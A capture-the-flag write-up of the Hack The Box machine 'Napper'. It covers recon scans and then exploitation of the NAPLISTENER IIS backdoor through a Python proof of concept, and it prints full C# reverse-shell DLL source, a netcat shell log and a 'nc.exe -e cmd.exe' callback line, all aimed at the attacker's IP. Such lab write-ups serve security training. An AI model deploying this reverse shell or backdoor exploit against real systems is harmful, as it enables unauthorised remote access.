---
title: "Hack The Box - Napper"
description: |
  Napper is a hard difficulty Windows machine on Hack the Box which hosts a static website that is backdoored by some real malware called NAPLISTENER and uses a custom LAPS alternative. The challenge starts with a scavenger hunt for credentials hidden within a blog post which grants access to an internal blog. This blog contains details about a real IIS backdoor, NAPLISTENER, a specially crafted .NET payload passed to the malware gives access to a shell on the box. Privilege escalation requires reversing a Golang binary and decrypting the password for a privileged user by utilizing the seed value and password hash stored in an Elasticsearch database. The decrypted creds grant Administrator access to the machine.
slug: hack-the-box-napper
date: 2024-05-05T20:00:00+01:00
categories: [writeup]
cover: ../../../assets/2024-05-05-hack-the-box-napper/cover.jpeg
---

## Recon

Scanning the machine with `nmap` I find 2 open ports HTTP on port 80 and HTTPS on 443.

```ansi title="zsh" multi-prompt
[1;32m┌──([1;96mnickvd[0m㉿[1;96mkali[1;32m)-[[0m~[1;32m]
[1;32m└─[1;96m$[0m nmap -sC -sV -p $(nmap -p- --min-rate 10000 -Pn "$IP" | awk -F/ '/open/ {b=b","$1} END {print substr(b,2)}') "$IP"

Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-13 05:37 EST
Nmap scan report for 10.10.11.240
Host is up (0.030s latency).

PORT     STATE SERVICE    VERSION
80/tcp   open  http       Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to https://app.napper.htb
443/tcp  open  ssl/http   Microsoft IIS httpd 10.0
|_http-generator: Hugo 0.112.3
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_ssl-date: 2023-11-13T09:38:37+00:00; -1h00m09s from scanner time.
| ssl-cert: Subject: commonName=app.napper.htb/organizationName=MLopsHub/stateOrProvinceName=California/countryName=US
| Subject Alternative Name: DNS:app.napper.htb
| Not valid before: 2023-06-07T14:58:55
|_Not valid after:  2033-06-04T14:58:55
|_http-title: Research Blog | Home
| tls-alpn:
|_  http/1.1
7680/tcp open  pando-pub?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1h00m09s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.57 seconds
```

That's generally not a lot of open ports for a Windows machine.

That’s not a lot of open ports for a Windows machine.

## HTTP(s) - TCP (80, 443)

The common name from the ssl cert points to `app.napper.hbt` so I add these domains into my `/etc/hosts` file.

Grabbing the cert:

```ansi title="zsh" multi-prompt
[1;32m┌──([1;96mnickvd[0m㉿[1;96mkali[1;32m)-[[0m~[1;32m]
[1;32m└─[1;96m$[0m openssl s_client -showcerts -connect 10.10.11.240:443 </dev/null | openssl x509 -text

Can't use SSL_get_servername
depth=0 C = US, ST = California, L = San Fransisco, O = MLopsHub, OU = MlopsHub Dev, CN = app.napper.htb
verify error:num=20:unable to get local issuer certificate
verify return:1
depth=0 C = US, ST = California, L = San Fransisco, O = MLopsHub, OU = MlopsHub Dev, CN = app.napper.htb
verify error:num=21:unable to verify the first certificate
verify return:1
depth=0 C = US, ST = California, L = San Fransisco, O = MLopsHub, OU = MlopsHub Dev, CN = app.napper.htb
verify return:1
DONE
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            b3:3b:7f:03:95:7c:c6:82
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: CN = ca.napper.htb, C = US, L = San Fransisco
        Validity
            Not Before: Jun  7 14:58:55 2023 GMT
            Not After : Jun  4 14:58:55 2033 GMT
        Subject: C = US, ST = California, L = San Fransisco, O = MLopsHub, OU = MlopsHub Dev, CN = app.napper.htb
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (2048 bit)
                Modulus:
                    00:aa:43:35:f4:4f:65:6c:4e:3b:ea:a1:7a:44:1a:
                    e2:bb:03:47:74:28:23:c0:bc:9b:6f:da:57:58:88:
                    2d:3d:e9:fa:84:d0:81:bf:3a:74:5c:b9:58:65:62:
                    77:34:db:33:60:7e:d9:ea:98:03:24:70:83:22:b4:
                    99:5e:d9:00:10:78:7b:01:da:0d:ed:91:4b:59:27:
                    07:c3:3f:ea:59:eb:01:8c:7d:83:60:77:c1:00:19:
                    26:aa:8a:ef:dd:d4:ba:32:aa:59:5c:92:bc:d5:ed:
                    5b:41:d4:bd:22:54:62:3e:62:53:60:75:f5:ef:eb:
                    df:77:b1:41:3f:65:da:01:1b:69:80:32:24:0c:43:
                    f2:3c:82:1e:19:f4:db:b6:4d:ff:13:73:7f:12:36:
                    57:ee:54:7b:96:00:0c:85:99:a9:12:99:9b:ec:0a:
                    10:d5:bb:4f:ad:a1:70:1f:f3:d7:1b:9a:f4:db:4b:
                    df:0b:e7:c2:ce:00:0a:5f:70:66:09:f4:b3:50:8d:
                    80:5f:3f:f6:18:9a:d1:b1:24:9d:8c:a4:c2:2c:98:
                    27:e4:26:ae:f5:b2:3e:20:ef:69:1f:71:ce:91:f5:
                    c3:89:62:c1:e2:2a:7e:f9:d1:8a:87:16:0c:11:ce:
                    71:c2:b7:05:dd:9b:04:ea:ce:36:72:2b:03:f2:93:
                    62:a7
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Authority Key Identifier:
                DirName:/CN=ca.napper.htb/C=US/L=San Fransisco
                serial:E3:1B:3D:4D:59:98:7A:F6
            X509v3 Basic Constraints:
                CA:FALSE
            X509v3 Key Usage:
                Digital Signature, Non Repudiation, Key Encipherment, Data Encipherment
            X509v3 Subject Alternative Name:
                DNS:app.napper.htb
    Signature Algorithm: sha256WithRSAEncryption
    Signature Value:
        1b:b2:e6:55:7d:db:41:49:5d:1e:23:d1:d5:92:02:aa:44:3c:
        25:e3:de:35:5c:ee:f6:e8:cc:fd:b8:b0:50:28:70:d0:b3:a1:
        d6:22:b8:a5:75:d0:dc:a1:5f:12:7e:af:18:2e:e4:78:26:5a:
        4e:3b:c9:ac:f5:ed:e6:30:30:35:98:9d:fa:08:19:15:4c:97:
        82:24:4a:f7:bf:f7:0a:f5:f9:17:a2:cb:02:0f:1b:20:86:fc:
        60:b1:93:72:88:38:6f:c8:c9:7f:63:f0:a4:7b:6e:14:e7:94:
        c3:e2:c5:55:6a:90:0b:b4:13:60:b0:67:c2:34:5a:68:c1:75:
        0c:c4:b3:8c:01:9a:99:91:3b:91:2a:a1:dc:5f:fe:39:0c:dd:
        ae:c2:53:44:37:9b:df:92:2b:03:a7:bd:aa:e7:d1:6a:7e:f9:
        49:a5:0f:8f:f2:f8:ef:3e:8f:df:94:45:7b:43:ed:11:25:65:
        fa:dc:bf:dc:24:9d:51:83:ec:7d:2c:53:df:0a:9f:95:82:55:
        a9:cc:8c:6b:5a:42:60:63:08:d7:53:5f:fe:ab:89:ff:74:aa:
        24:e0:cb:0d:e6:1b:0f:08:c9:ab:5f:5c:0c:05:ef:98:e4:bc:
        1e:2f:4c:01:e4:ce:25:57:c9:fa:28:ce:c5:af:3a:81:7c:fd:
        88:8c:2a:c2
-----BEGIN CERTIFICATE-----
MIIDzTCCArWgAwIBAgIJALM7fwOVfMaCMA0GCSqGSIb3DQEBCwUAMD0xFjAUBgNV
BAMMDWNhLm5hcHBlci5odGIxCzAJBgNVBAYTAlVTMRYwFAYDVQQHDA1TYW4gRnJh
bnNpc2NvMB4XDTIzMDYwNzE0NTg1NVoXDTMzMDYwNDE0NTg1NVowfTELMAkGA1UE
BhMCVVMxEzARBgNVBAgMCkNhbGlmb3JuaWExFjAUBgNVBAcMDVNhbiBGcmFuc2lz
Y28xETAPBgNVBAoMCE1Mb3BzSHViMRUwEwYDVQQLDAxNbG9wc0h1YiBEZXYxFzAV
BgNVBAMMDmFwcC5uYXBwZXIuaHRiMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIB
CgKCAQEAqkM19E9lbE476qF6RBriuwNHdCgjwLybb9pXWIgtPen6hNCBvzp0XLlY
ZWJ3NNszYH7Z6pgDJHCDIrSZXtkAEHh7AdoN7ZFLWScHwz/qWesBjH2DYHfBABkm
qorv3dS6MqpZXJK81e1bQdS9IlRiPmJTYHX17+vfd7FBP2XaARtpgDIkDEPyPIIe
GfTbtk3/E3N/EjZX7lR7lgAMhZmpEpmb7AoQ1btPraFwH/PXG5r020vfC+fCzgAK
X3BmCfSzUI2AXz/2GJrRsSSdjKTCLJgn5Cau9bI+IO9pH3HOkfXDiWLB4ip++dGK
hxYMEc5xwrcF3ZsE6s42cisD8pNipwIDAQABo4GPMIGMMFcGA1UdIwRQME6hQaQ/
MD0xFjAUBgNVBAMMDWNhLm5hcHBlci5odGIxCzAJBgNVBAYTAlVTMRYwFAYDVQQH
DA1TYW4gRnJhbnNpc2NvggkA4xs9TVmYevYwCQYDVR0TBAIwADALBgNVHQ8EBAMC
BPAwGQYDVR0RBBIwEIIOYXBwLm5hcHBlci5odGIwDQYJKoZIhvcNAQELBQADggEB
ABuy5lV920FJXR4j0dWSAqpEPCXj3jVc7vbozP24sFAocNCzodYiuKV10NyhXxJ+
rxgu5HgmWk47yaz17eYwMDWYnfoIGRVMl4IkSve/9wr1+ReiywIPGyCG/GCxk3KI
OG/IyX9j8KR7bhTnlMPixVVqkAu0E2CwZ8I0WmjBdQzEs4wBmpmRO5Eqodxf/jkM
3a7CU0Q3m9+SKwOnvarn0Wp++UmlD4/y+O8+j9+URXtD7RElZfrcv9wknVGD7H0s
U98Kn5WCVanMjGtaQmBjCNdTX/6rif90qiTgyw3mGw8IyatfXAwF75jkvB4vTAHk
ziVXyfoozsWvOoF8/YiMKsI=
-----END CERTIFICATE-----
```

The issuer seems to be `ca.napper.htb` , so I’m also adding this one into my hosts file.

Gobuster directory scan:

```ansi title="zsh" multi-prompt
[1;32m┌──([1;96mnickvd[0m㉿[1;96mkali[1;32m)-[[0m~[1;32m]
[1;32m└─[1;96m$[0m gobuster dir -u https://app.napper.htb -k -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://app.napper.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/page                 (Status: 301) [Size: 151] [--> https://app.napper.htb/page/]
/categories           (Status: 301) [Size: 157] [--> https://app.napper.htb/categories/]
/posts                (Status: 301) [Size: 152] [--> https://app.napper.htb/posts/]
/css                  (Status: 301) [Size: 150] [--> https://app.napper.htb/css/]
/tags                 (Status: 301) [Size: 151] [--> https://app.napper.htb/tags/]
/js                   (Status: 301) [Size: 149] [--> https://app.napper.htb/js/]
/Page                 (Status: 301) [Size: 151] [--> https://app.napper.htb/Page/]
/fonts                (Status: 301) [Size: 152] [--> https://app.napper.htb/fonts/]
/Categories           (Status: 301) [Size: 157] [--> https://app.napper.htb/Categories/]
/Fonts                (Status: 301) [Size: 152] [--> https://app.napper.htb/Fonts/]
/CSS                  (Status: 301) [Size: 150] [--> https://app.napper.htb/CSS/]
/JS                   (Status: 301) [Size: 149] [--> https://app.napper.htb/JS/]
/PAGE                 (Status: 301) [Size: 151] [--> https://app.napper.htb/PAGE/]
/Tags                 (Status: 301) [Size: 151] [--> https://app.napper.htb/Tags/]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

Gobuster vhost scan

```ansi title="zsh" multi-prompt
[1;32m┌──([1;96mnickvd[0m㉿[1;96mkali[1;32m)-[[0m~[1;32m]
[1;32m└─[1;96m$[0m gobuster vhost -u https://napper.htb -k -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             https://napper.htb
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: internal.napper.htb Status: 401 [Size: 1293]
Found: xn--nckxa3g7cq2b5304djmxc-biz.napper.htb Status: 400 [Size: 334]
Found: xn--cckcdp5nyc8g2837ahhi954c-jp.napper.htb Status: 400 [Size: 334]
Found: xn--7ck2d4a8083aybt3yv-com.napper.htb Status: 400 [Size: 334]
Found: xn--u9jxfma8gra4a5989bhzh976brkn72bo46f-com.napper.htb Status: 400 [Size: 334]
<...snip...>
Found: xn--n8jl84alc9fsf5446c-com.napper.htb Status: 400 [Size: 334]
Progress: 114441 / 114442 (100.00%)
===============================================================
Finished
===============================================================
```

### app.napper.htb

### internal.napper.htb

Using the username and password found in the blog post.

- example:ExamplePassword

I can login and get access to the internal domain

## Foothold

Some links mentioned in the article:

- https://www.elastic.co/security-labs/naplistener-more-bad-dreams-from-the-developers-of-siestagraph
- https://www.darkreading.com/threat-intelligence/custom-naplistener-malware-network-based-detection-sleep

The elastic blog post contains a little POC script to execute the payload:


```python title="poc.py" "<base64_encoded_dll>"
import requests
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


hosts=["napper.htb"]
payload = "<base64_encoded_dll>"
form_field=f"sdafwe3rwe23={requests.utils.quote(payload)}"

for h in hosts:
   url_ssl= f"https://{h}/ews/MsExgHealthCheckd/"

   try:
       r_ssl = requests.post(url_ssl, data=form_field, verify=False)
       print(f"{url_ssl} : {r_ssl.status_code} {r_ssl.headers}")
   except KeyboardInterupt:
       exit()
   except Exception as e:
       print(e)
       pass
```

I then created a DLL with the following code:

```c# title="rev_shell.cs"
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace NapperShellDLL
{
    public class Run
    {
        public Run()
        {
            using (TcpClient client = new TcpClient("10.10.14.3", 443))
            {
                using (Stream stream = client.GetStream())
                {
                    using (StreamReader rdr = new StreamReader(stream))
                    {
                        var writer = new StreamWriter(stream);

                        var strInput = new StringBuilder();

                        var p = new Process();
                        p.StartInfo.FileName = "cmd.exe";
                        p.StartInfo.CreateNoWindow = true;
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.RedirectStandardInput = true;
                        p.StartInfo.RedirectStandardError = true;
                        p.OutputDataReceived += new DataReceivedEventHandler((object sendingProcess, DataReceivedEventArgs outLine) =>
                        {
                            var strOutput = new StringBuilder();

                            if (!String.IsNullOrEmpty(outLine.Data))
                            {
                                try
                                {
                                    strOutput.Append(outLine.Data);
                                    writer.WriteLine(strOutput);
                                    writer.Flush();
                                }
                                catch (Exception err) { }
                            }
                        });
                        p.Start();
                        p.BeginOutputReadLine();

                        while (true)
                        {
                            strInput.Append(rdr.ReadLine());
                            //strInput.Append("\n");
                            p.StandardInput.WriteLine(strInput);
                            strInput.Remove(0, strInput.Length);
                        }
                    }
                }
            }
        }
    }
}
```

Which is a play on: https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc

Executing the python script returns a shell as ruben

```ansi title="zsh" multi-prompt
[1;32m┌──([1;96mnickvd[0m㉿[1;96mkali[1;32m)-[[0m~[1;32m]
[1;32m└─[1;96m$[0m nc -lnvp 443

listening on [any] 443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.11.240] 62870
Microsoft Windows [Version 10.0.19045.3636]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami

napper\ruben
```

## Shell as Ruben
And here I find the user flag

```ansi title="cmd" {8,13}
c:\Users\ruben\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is CB08-11BF
 Directory of c:\Users\ruben\Desktop
06/09/2023  06:00 AM    <DIR>          .
06/09/2023  06:00 AM    <DIR>          ..
06/07/2023  06:02 AM             2,352 Microsoft Edge.lnk
11/12/2023  05:42 PM                34 user.txt
               2 File(s)          2,386 bytes
               2 Dir(s)   3,394,306,048 bytes free

c:\Users\ruben\Desktop>type user.txt
0f44709d76e54fc7fb85f80308c780f1
```

Upgrade my shell by uploading nc.exe

```powershell title="powershell"
PS C:\Temp> Start-Process -FilePath powershell.exe -argumentlist "C:\temp\nc.exe 10.10.14.3 443 -e cmd.exe"
```
